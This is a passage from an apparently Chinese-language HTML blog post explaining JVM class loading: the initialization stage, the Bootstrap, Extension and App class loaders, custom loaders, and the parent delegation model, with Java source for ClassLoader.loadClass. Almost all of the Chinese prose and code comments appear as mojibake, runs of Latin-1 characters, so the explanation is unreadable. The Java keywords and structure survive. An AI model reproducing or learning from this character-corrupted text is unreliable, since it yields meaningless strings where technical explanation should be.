å†…çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ°è¿™ä¸ªæ—¶å€™ï¼Œæ‰€æœ‰å¼•ç”¨å˜é‡çš„æŒ‡å‘éƒ½æ˜¯å·²ç»åˆ‡åˆ‡å®å®åœ°æŒ‡å‘äº†å†…å­˜ä¸­çš„å¯¹è±¡äº†ã€‚</p><p>åˆ°è¿™é‡Œï¼Œé“¾æ¥è¿‡ç¨‹å°±ç»“æŸäº†ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ—¶å€™ç±»åŸºæœ¬ä¸Šå·²ç»å®Œæˆå¤§éƒ¨åˆ†å†…å®¹çš„åˆå§‹åŒ–äº†ã€‚</p><p>æœ€åå°±æ˜¯çœŸæ­£çš„<strong>åˆå§‹åŒ–</strong>é˜¶æ®µäº†ã€‚</p><p>åˆå§‹åŒ–é˜¶æ®µæ˜¯æ‰§è¡Œåˆå§‹åŒ–æ–¹æ³• <code>&lt;clinit&gt; ()</code>æ–¹æ³•çš„è¿‡ç¨‹ï¼Œæ˜¯ç±»åŠ è½½çš„æœ€åä¸€æ­¥ï¼Œè¿™ä¸€æ­¥ JVM æ‰å¼€å§‹çœŸæ­£æ‰§è¡Œç±»ä¸­å®šä¹‰çš„ Java ç¨‹åºä»£ç (å­—èŠ‚ç )ã€‚</p><blockquote><p>è¯´æ˜ï¼š<code>&lt;clinit&gt; ()</code>æ–¹æ³•æ˜¯ç¼–è¯‘ä¹‹åè‡ªåŠ¨ç”Ÿæˆçš„ã€‚</p></blockquote><hr><h3 id="ç±»åŠ è½½å™¨-ClassLoader"><a href="#ç±»åŠ è½½å™¨-ClassLoader" class="headerlink" title="ç±»åŠ è½½å™¨(ClassLoader)"></a>ç±»åŠ è½½å™¨(ClassLoader)</h3><p>å¼€å§‹ä»‹ç»ç±»åŠ è½½å™¨å’ŒåŒäº²å§”æ´¾æ¨¡å‹ä¹‹å‰ï¼Œç®€å•å›é¡¾ä¸€ä¸‹ç±»åŠ è½½è¿‡ç¨‹ã€‚</p><p>ç±»åŠ è½½è¿‡ç¨‹ï¼š<strong>åŠ è½½-&gt;é“¾æ¥-&gt;åˆå§‹åŒ–</strong>ã€‚<br>é“¾æ¥è¿‡ç¨‹åˆå¯åˆ†ä¸ºä¸‰æ­¥ï¼š<strong>éªŒè¯-&gt;å‡†å¤‡-&gt;è§£æ</strong>ã€‚</p><p><img src="https://pb01.s3.bitiful.net/138.png" alt="avatar"></p><p>åŠ è½½æ˜¯ç±»åŠ è½½è¿‡ç¨‹çš„ç¬¬ä¸€æ­¥ï¼Œä¸»è¦å®Œæˆä¸‹é¢ 3 ä»¶äº‹æƒ…ï¼š</p><ol><li>é€šè¿‡å…¨ç±»åè·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµ</li><li>å°†å­—èŠ‚æµæ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬æ¢ä¸ºæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„</li><li>åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¯¥ç±»çš„ <code>Class</code> å¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™äº›æ•°æ®çš„è®¿é—®å…¥å£</li></ol><ul><li>ç±»åŠ è½½å™¨æ˜¯ä¸€ä¸ªè´Ÿè´£åŠ è½½ç±»çš„å¯¹è±¡ï¼Œç”¨äºå®ç°ç±»åŠ è½½è¿‡ç¨‹ä¸­çš„åŠ è½½è¿™ä¸€æ­¥ã€‚</li><li>æ¯ä¸ª Java ç±»éƒ½æœ‰ä¸€ä¸ªå¼•ç”¨æŒ‡å‘åŠ è½½å®ƒçš„ ClassLoaderã€‚</li><li>æ•°ç»„ç±»ä¸æ˜¯é€šè¿‡ ClassLoader åˆ›å»ºçš„ï¼ˆæ•°ç»„ç±»æ²¡æœ‰å¯¹åº”çš„äºŒè¿›åˆ¶å­—èŠ‚æµï¼‰ï¼Œæ˜¯ç”± JVM ç›´æ¥ç”Ÿæˆçš„ã€‚</li></ul><p>ç®€å•æ¥è¯´ï¼Œç±»åŠ è½½å™¨çš„ä¸»è¦ä½œç”¨å°±<strong>æ˜¯åŠ è½½ Java ç±»çš„å­—èŠ‚ç ï¼ˆ .class æ–‡ä»¶ï¼‰åˆ° JVM ä¸­ï¼ˆåœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¯¥ç±»çš„ Class å¯¹è±¡ï¼‰</strong>ã€‚ å­—èŠ‚ç å¯ä»¥æ˜¯ Java æºç¨‹åºï¼ˆ.javaæ–‡ä»¶ï¼‰ç»è¿‡ javac ç¼–è¯‘å¾—æ¥ï¼Œä¹Ÿå¯ä»¥æ˜¯é€šè¿‡å·¥å…·åŠ¨æ€ç”Ÿæˆæˆ–è€…é€šè¿‡ç½‘ç»œä¸‹è½½å¾—æ¥ã€‚</p><p>å…¶å®é™¤äº†åŠ è½½ç±»ä¹‹å¤–ï¼Œç±»åŠ è½½å™¨è¿˜å¯ä»¥åŠ è½½ Java åº”ç”¨æ‰€éœ€çš„èµ„æºå¦‚æ–‡æœ¬ã€å›¾åƒã€é…ç½®æ–‡ä»¶ã€è§†é¢‘ç­‰ç­‰æ–‡ä»¶èµ„æºã€‚</p><h4 id="ç±»åŠ è½½å™¨åŠ è½½è§„åˆ™"><a href="#ç±»åŠ è½½å™¨åŠ è½½è§„åˆ™" class="headerlink" title="ç±»åŠ è½½å™¨åŠ è½½è§„åˆ™"></a>ç±»åŠ è½½å™¨åŠ è½½è§„åˆ™</h4><p>JVM å¯åŠ¨çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰çš„ç±»ï¼Œè€Œæ˜¯æ ¹æ®éœ€è¦å»åŠ¨æ€åŠ è½½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¤§éƒ¨åˆ†ç±»åœ¨å…·ä½“ç”¨åˆ°çš„æ—¶å€™æ‰ä¼šå»åŠ è½½ï¼Œè¿™æ ·å¯¹å†…å­˜æ›´åŠ å‹å¥½ã€‚å¯¹äºå·²ç»åŠ è½½çš„ç±»ä¼šè¢«æ”¾åœ¨ ClassLoader ä¸­ã€‚</p><p>åœ¨ç±»åŠ è½½çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šé¦–å…ˆåˆ¤æ–­å½“å‰ç±»æ˜¯å¦è¢«åŠ è½½è¿‡ã€‚å·²ç»è¢«åŠ è½½çš„ç±»ä¼šç›´æ¥è¿”å›ï¼Œå¦åˆ™æ‰ä¼šå°è¯•åŠ è½½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>å¯¹äºä¸€ä¸ªç±»åŠ è½½å™¨æ¥è¯´ï¼Œç›¸åŒäºŒè¿›åˆ¶åç§°çš„ç±»åªä¼šè¢«åŠ è½½ä¸€æ¬¡</strong>ã€‚</p><h4 id="ç±»åŠ è½½å™¨æ€»ç»“"><a href="#ç±»åŠ è½½å™¨æ€»ç»“" class="headerlink" title="ç±»åŠ è½½å™¨æ€»ç»“"></a>ç±»åŠ è½½å™¨æ€»ç»“</h4><p>JVM ä¸­å†…ç½®äº†ä¸‰ä¸ªé‡è¦çš„ ClassLoaderï¼š</p><ol><li><strong>BootstrapClassLoader(å¯åŠ¨ç±»åŠ è½½å™¨)</strong>: æœ€é¡¶å±‚çš„åŠ è½½ç±»ï¼Œç”± C++å®ç°ï¼Œé€šå¸¸è¡¨ç¤ºä¸º nullï¼Œå¹¶ä¸”æ²¡æœ‰çˆ¶çº§ï¼Œä¸»è¦ç”¨æ¥åŠ è½½ JDK å†…éƒ¨çš„æ ¸å¿ƒç±»åº“ï¼ˆ <code>%JAVA_HOME%/lib</code>ç›®å½•ä¸‹çš„ <code>rt.jar</code>ã€<code>resources.jar</code>ã€<code>charsets.jar</code>ç­‰ jar åŒ…å’Œç±»ï¼‰ä»¥åŠè¢« <code>-Xbootclasspath</code>å‚æ•°æŒ‡å®šçš„è·¯å¾„ä¸‹çš„æ‰€æœ‰ç±»ã€‚</li><li><strong>ExtensionClassLoader(æ‰©å±•ç±»åŠ è½½å™¨)</strong>: ä¸»è¦è´Ÿè´£åŠ è½½ <code>%JRE_HOME%/lib/ext</code> ç›®å½•ä¸‹çš„ jar åŒ…å’Œç±»ä»¥åŠè¢« <code>java.ext.dirs</code> ç³»ç»Ÿå˜é‡æ‰€æŒ‡å®šçš„è·¯å¾„ä¸‹çš„æ‰€æœ‰ç±»ã€‚</li><li><strong>AppClassLoader(åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨)</strong>: é¢å‘æˆ‘ä»¬ç”¨æˆ·çš„åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½å½“å‰åº”ç”¨ classpath ä¸‹çš„æ‰€æœ‰ jar åŒ…å’Œç±»ã€‚</li></ol><p>é™¤äº†è¿™ä¸‰ç§ç±»åŠ è½½å™¨ä¹‹å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥åŠ å…¥è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨æ¥è¿›è¡Œæ‹“å±•ï¼Œä»¥æ»¡è¶³è‡ªå·±çš„ç‰¹æ®Šéœ€æ±‚ã€‚å°±æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹ Java ç±»çš„å­—èŠ‚ç ï¼ˆ .class æ–‡ä»¶ï¼‰è¿›è¡ŒåŠ å¯†ï¼ŒåŠ è½½æ—¶å†åˆ©ç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨å¯¹å…¶è§£å¯†ã€‚</p><p><img src="https://pb01.s3.bitiful.net/139.png" alt="avatar"></p><p>é™¤äº†å¯åŠ¨ç±»åŠ è½½å™¨æ˜¯ JVM è‡ªèº«çš„ä¸€éƒ¨åˆ†ä¹‹å¤–ï¼Œå…¶ä»–æ‰€æœ‰çš„ç±»åŠ è½½å™¨éƒ½æ˜¯åœ¨ JVM å¤–éƒ¨å®ç°çš„ï¼Œå¹¶ä¸”å…¨éƒ½ç»§æ‰¿è‡ª ClassLoaderæŠ½è±¡ç±»ã€‚</p><p>è¿™æ ·åšçš„å¥½å¤„æ˜¯ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œä»¥ä¾¿è®©åº”ç”¨ç¨‹åºè‡ªå·±å†³å®šå¦‚ä½•å»è·å–æ‰€éœ€çš„ç±»ã€‚æ¯ä¸ª ClassLoader å¯ä»¥é€šè¿‡getParent()è·å–å…¶çˆ¶ ClassLoaderï¼Œå¦‚æœè·å–åˆ° ClassLoader ä¸ºnullçš„è¯ï¼Œé‚£ä¹ˆè¯¥ç±»å°±æ˜¯æ˜¯é€šè¿‡ å¯åŠ¨ç±»åŠ è½½å™¨ åŠ è½½çš„</p><p><strong>ä¸ºä»€ä¹ˆè·å–åˆ°çš„ClassLoader ä¸ºnullå°±æ˜¯å¯åŠ¨ç±»åŠ è½½å™¨åŠ è½½çš„å‘¢ï¼Ÿ</strong> è¿™æ˜¯å› ä¸ºå¯åŠ¨ç±»åŠ è½½å™¨ç”± C++ å®ç°ï¼Œç”±äºè¿™ä¸ª C++ å®ç°çš„ç±»åŠ è½½å™¨åœ¨ Java ä¸­æ˜¯æ²¡æœ‰ä¸ä¹‹å¯¹åº”çš„ç±»çš„ï¼Œæ‰€ä»¥æ‹¿åˆ°çš„ç»“æœæ˜¯ nullã€‚</p><h4 id="è‡ªå®šä¹‰ç±»åŠ è½½å™¨"><a href="#è‡ªå®šä¹‰ç±»åŠ è½½å™¨" class="headerlink" title="è‡ªå®šä¹‰ç±»åŠ è½½å™¨"></a>è‡ªå®šä¹‰ç±»åŠ è½½å™¨</h4><p>æˆ‘ä»¬å‰é¢ä¹Ÿè¯´è¯´äº†ï¼Œé™¤äº†å¯åŠ¨ç±»åŠ è½½å™¨,å…¶ä»–ç±»åŠ è½½å™¨å‡ç”± Java å®ç°ä¸”å…¨éƒ¨ç»§æ‰¿è‡ªjava.lang.ClassLoaderã€‚å¦‚æœæˆ‘ä»¬è¦è‡ªå®šä¹‰è‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œå¾ˆæ˜æ˜¾éœ€è¦ç»§æ‰¿ ClassLoaderæŠ½è±¡ç±»ã€‚</p><p>ClassLoader ç±»æœ‰ä¸¤ä¸ªå…³é”®çš„æ–¹æ³•ï¼š</p><ul><li><strong>protected Class loadClass(String name, boolean resolve)</strong>ï¼šåŠ è½½æŒ‡å®šäºŒè¿›åˆ¶åç§°çš„ç±»ï¼Œå®ç°äº†åŒäº²å§”æ´¾æœºåˆ¶ ã€‚name ä¸ºç±»çš„äºŒè¿›åˆ¶åç§°ï¼Œresolve å¦‚æœä¸º trueï¼Œåœ¨åŠ è½½æ—¶è°ƒç”¨ resolveClass(Class&lt;?&gt; c) æ–¹æ³•è§£æè¯¥ç±»ã€‚</li><li><strong>protected Class findClass(String name)</strong>ï¼šæ ¹æ®ç±»çš„äºŒè¿›åˆ¶åç§°æ¥æŸ¥æ‰¾ç±»ï¼Œé»˜è®¤å®ç°æ˜¯ç©ºæ–¹æ³•ã€‚</li></ul><p>å®˜æ–¹ API æ–‡æ¡£ä¸­å†™åˆ°ï¼š</p><blockquote><p>å»ºè®® ClassLoaderçš„å­ç±»é‡å†™ findClass(String name)æ–¹æ³•è€Œä¸æ˜¯loadClass(String name, boolean resolve) æ–¹æ³•ã€‚</p></blockquote><p>å¦‚æœæˆ‘ä»¬ä¸æƒ³æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹ï¼Œå°±é‡å†™ ClassLoader ç±»ä¸­çš„ findClass() æ–¹æ³•å³å¯ï¼Œæ— æ³•è¢«çˆ¶ç±»åŠ è½½å™¨åŠ è½½çš„ç±»æœ€ç»ˆä¼šé€šè¿‡è¿™ä¸ªæ–¹æ³•è¢«åŠ è½½ã€‚ä½†æ˜¯ï¼Œå¦‚æœæƒ³æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹åˆ™éœ€è¦é‡å†™ loadClass() æ–¹æ³•ã€‚</p><h3 id="åŒäº²å§”æ´¾æ¨¡å‹"><a href="#åŒäº²å§”æ´¾æ¨¡å‹" class="headerlink" title="åŒäº²å§”æ´¾æ¨¡å‹"></a>åŒäº²å§”æ´¾æ¨¡å‹</h3><h4 id="åŒäº²å§”æ´¾æ¨¡å‹ä»‹ç»"><a href="#åŒäº²å§”æ´¾æ¨¡å‹ä»‹ç»" class="headerlink" title="åŒäº²å§”æ´¾æ¨¡å‹ä»‹ç»"></a>åŒäº²å§”æ´¾æ¨¡å‹ä»‹ç»</h4><p>ç±»åŠ è½½å™¨æœ‰å¾ˆå¤šç§ï¼Œå½“æˆ‘ä»¬æƒ³è¦åŠ è½½ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œå…·ä½“æ˜¯å“ªä¸ªç±»åŠ è½½å™¨åŠ è½½å‘¢ï¼Ÿè¿™å°±éœ€è¦æåˆ°åŒäº²å§”æ´¾æ¨¡å‹äº†ã€‚</p><p><code>ClassLoader</code> ç±»ä½¿ç”¨å§”æ‰˜æ¨¡å‹æ¥æœç´¢ç±»å’Œèµ„æºã€‚æ¯ä¸ª <code>ClassLoader</code> å®ä¾‹éƒ½æœ‰ä¸€ä¸ªç›¸å…³çš„çˆ¶ç±»åŠ è½½å™¨ã€‚éœ€è¦æŸ¥æ‰¾ç±»æˆ–èµ„æºæ—¶ï¼Œ<code>ClassLoader</code> å®ä¾‹ä¼šåœ¨è¯•å›¾äº²è‡ªæŸ¥æ‰¾ç±»æˆ–èµ„æºä¹‹å‰ï¼Œå°†æœç´¢ç±»æˆ–èµ„æºçš„ä»»åŠ¡å§”æ‰˜ç»™å…¶çˆ¶ç±»åŠ è½½å™¨ã€‚åŒäº²å§”æ´¾æ¨¡å‹è¦æ±‚é™¤äº†é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨å¤–ï¼Œå…¶ä½™çš„ç±»åŠ è½½å™¨éƒ½åº”æœ‰è‡ªå·±çš„çˆ¶ç±»åŠ è½½å™¨ã€‚</p><p>ä¸‹å›¾å±•ç¤ºçš„å„ç§ç±»åŠ è½½å™¨ä¹‹é—´çš„å±‚æ¬¡å…³ç³»è¢«ç§°ä¸ºç±»åŠ è½½å™¨çš„â€œ<strong>åŒäº²å§”æ´¾æ¨¡å‹(Parents Delegation Model)</strong>â€ã€‚</p><p><img src="https://pb01.s3.bitiful.net/139.png" alt="avatar"></p><p>æ³¨æ„ âš ï¸ï¼šåŒäº²å§”æ´¾æ¨¡å‹å¹¶ä¸æ˜¯ä¸€ç§å¼ºåˆ¶æ€§çš„çº¦æŸï¼Œåªæ˜¯ JDK å®˜æ–¹æ¨èçš„ä¸€ç§æ–¹å¼ã€‚å¦‚æœæˆ‘ä»¬å› ä¸ºæŸäº›ç‰¹æ®Šéœ€æ±‚æƒ³è¦æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„.</p><p>å…¶å®è¿™ä¸ªåŒäº²ç¿»è¯‘çš„å®¹æ˜“è®©åˆ«äººè¯¯è§£ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç†è§£çš„åŒäº²éƒ½æ˜¯çˆ¶æ¯ï¼Œè¿™é‡Œçš„åŒäº²æ›´å¤šåœ°è¡¨è¾¾çš„æ˜¯â€œçˆ¶æ¯è¿™ä¸€è¾ˆâ€çš„äººè€Œå·²ï¼Œå¹¶ä¸æ˜¯è¯´çœŸçš„æœ‰ä¸€ä¸ª MotherClassLoader å’Œä¸€ä¸ªFatherClassLoader ã€‚</p><p>å¦å¤–ï¼Œç±»åŠ è½½å™¨ä¹‹é—´çš„çˆ¶å­å…³ç³»ä¸€èˆ¬ä¸æ˜¯ä»¥ç»§æ‰¿çš„å…³ç³»æ¥å®ç°çš„ï¼Œè€Œæ˜¯é€šå¸¸ä½¿ç”¨ç»„åˆå…³ç³»æ¥å¤ç”¨çˆ¶åŠ è½½å™¨çš„ä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// ç»„åˆ</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line">  <span class="keyword">protected</span> <span class="title function_">ClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>(checkCreateClassLoader(), parent);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ï¼Œæœ‰ä¸€æ¡éå¸¸ç»å…¸çš„è®¾è®¡åŸåˆ™ï¼š<strong>ç»„åˆä¼˜äºç»§æ‰¿ï¼Œå¤šç”¨ç»„åˆå°‘ç”¨ç»§æ‰¿</strong>ã€‚</p><h4 id="åŒäº²å§”æ´¾æ¨¡å‹çš„æ‰§è¡Œæµç¨‹"><a href="#åŒäº²å§”æ´¾æ¨¡å‹çš„æ‰§è¡Œæµç¨‹" class="headerlink" title="åŒäº²å§”æ´¾æ¨¡å‹çš„æ‰§è¡Œæµç¨‹"></a>åŒäº²å§”æ´¾æ¨¡å‹çš„æ‰§è¡Œæµç¨‹</h4><ol><li>åœ¨ç±»åŠ è½½çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šé¦–å…ˆåˆ¤æ–­å½“å‰ç±»æ˜¯å¦è¢«åŠ è½½è¿‡ã€‚å·²ç»è¢«åŠ è½½çš„ç±»ä¼šç›´æ¥è¿”å›ï¼Œå¦åˆ™æ‰ä¼šå°è¯•åŠ è½½ï¼ˆæ¯ä¸ªçˆ¶ç±»åŠ è½½å™¨éƒ½ä¼šèµ°ä¸€éè¿™ä¸ªæµç¨‹ï¼‰ã€‚</li><li>ç±»åŠ è½½å™¨åœ¨è¿›è¡Œç±»åŠ è½½çš„æ—¶å€™ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼ˆè°ƒç”¨çˆ¶åŠ è½½å™¨ loadClass()æ–¹æ³•æ¥åŠ è½½ç±»ï¼‰ã€‚è¿™æ ·çš„è¯ï¼Œæ‰€æœ‰çš„è¯·æ±‚æœ€ç»ˆéƒ½ä¼šä¼ é€åˆ°é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ BootstrapClassLoader ä¸­ã€‚</li><li>åªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¿™ä¸ªåŠ è½½è¯·æ±‚ï¼ˆå®ƒçš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ï¼ˆè°ƒç”¨è‡ªå·±çš„ findClass() æ–¹æ³•æ¥åŠ è½½ç±»ï¼‰ã€‚</li><li>å¦‚æœå­ç±»åŠ è½½å™¨ä¹Ÿæ— æ³•åŠ è½½è¿™ä¸ªç±»ï¼Œé‚£ä¹ˆå®ƒä¼šæŠ›å‡ºä¸€ä¸ª ClassNotFoundException å¼‚å¸¸ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">//é¦–å…ˆï¼Œæ£€æŸ¥è¯¥ç±»æ˜¯å¦å·²ç»åŠ è½½è¿‡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœ c ä¸º nullï¼Œåˆ™è¯´æ˜è¯¥ç±»æ²¡æœ‰è¢«åŠ è½½è¿‡</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">//å½“çˆ¶ç±»çš„åŠ è½½å™¨ä¸ä¸ºç©ºï¼Œåˆ™é€šè¿‡çˆ¶ç±»çš„loadClassæ¥åŠ è½½è¯¥ç±»</span></span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//å½“çˆ¶ç±»çš„åŠ è½½å™¨ä¸ºç©ºï¼Œåˆ™è°ƒç”¨å¯åŠ¨ç±»åŠ è½½å™¨æ¥åŠ è½½è¯¥ç±»</span></span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">//éç©ºçˆ¶ç±»çš„ç±»åŠ è½½å™¨æ— æ³•æ‰¾åˆ°ç›¸åº”çš„ç±»ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//å½“çˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½æ—¶ï¼Œåˆ™è°ƒç”¨findClassæ–¹æ³•æ¥åŠ è½½è¯¥ç±»</span></span><br><span class="line">                <span class="comment">//ç”¨æˆ·å¯é€šè¿‡è¦†å†™è¯¥æ–¹æ³•ï¼Œæ¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//ç”¨äºç»Ÿè®¡ç±»åŠ è½½å™¨ç›¸å…³çš„ä¿¡æ¯</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            <span class="comment">//å¯¹ç±»è¿›è¡Œlinkæ“ä½œ</span></span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ğŸŒˆ æ‹“å±•ä¸€ä¸‹ï¼š<br><strong>JVM åˆ¤å®šä¸¤ä¸ª Java ç±»æ˜¯å¦ç›¸åŒçš„å…·ä½“è§„åˆ™</strong>: JVM ä¸ä»…è¦çœ‹ç±»çš„å…¨åæ˜¯å¦ç›¸åŒï¼Œè¿˜è¦çœ‹åŠ è½½æ­¤ç±»çš„ç±»åŠ è½½å™¨æ˜¯å¦ä¸€æ ·ã€‚åªæœ‰ä¸¤è€…éƒ½ç›¸åŒçš„æƒ…å†µï¼Œæ‰è®¤ä¸ºä¸¤ä¸ªç±»æ˜¯ç›¸åŒçš„ã€‚å³ä½¿ä¸¤ä¸ªç±»æ¥æºäºåŒä¸€ä¸ª Class æ–‡ä»¶ï¼Œè¢«åŒä¸€ä¸ªè™šæ‹ŸæœºåŠ è½½ï¼Œåªè¦åŠ è½½å®ƒä»¬çš„ç±»åŠ è½½å™¨ä¸åŒï¼Œé‚£è¿™ä¸¤ä¸ªç±»å°±å¿…å®šä¸ç›¸åŒã€‚</p><p>åŒäº²å§”æ´¾æ¨¡å‹ä¿è¯äº† Java ç¨‹åºçš„ç¨³å®šè¿è¡Œï¼Œ<strong>å¯ä»¥é¿å…ç±»çš„é‡å¤åŠ è½½</strong>ï¼ˆJVM åŒºåˆ†ä¸åŒç±»çš„æ–¹å¼ä¸ä»…ä»…æ ¹æ®ç±»åï¼Œç›¸åŒçš„ç±»æ–‡ä»¶è¢«ä¸åŒçš„ç±»åŠ è½½å™¨åŠ è½½äº§ç”Ÿçš„æ˜¯ä¸¤ä¸ªä¸åŒçš„ç±»ï¼‰ï¼Œ<strong>ä¹Ÿä¿è¯äº† Java çš„æ ¸å¿ƒ API ä¸è¢«ç¯¡æ”¹</strong>ã€‚</p><p>å¦‚æœæ²¡æœ‰ä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹ï¼Œè€Œæ˜¯æ¯ä¸ªç±»åŠ è½½å™¨åŠ è½½è‡ªå·±çš„è¯å°±ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªç§°ä¸º <code>java.lang.Object</code>ç±»çš„è¯ï¼Œé‚£ä¹ˆç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œç³»ç»Ÿå°±ä¼šå‡ºç°ä¸¤ä¸ªä¸åŒçš„ <code>Object</code> ç±»ã€‚åŒäº²å§”æ´¾æ¨¡å‹å¯ä»¥ä¿è¯åŠ è½½çš„æ˜¯ JRE é‡Œçš„é‚£ä¸ª <code>Object</code> ç±»ï¼Œè€Œä¸æ˜¯ä½ å†™çš„ <code>Object</code> ç±»ã€‚è¿™æ˜¯å› ä¸º <code>AppClassLoader</code> åœ¨åŠ è½½ä½ çš„ <code>Object</code> ç±»æ—¶ï¼Œä¼šå§”æ‰˜ç»™ <code>ExtClassLoader</code> å»åŠ 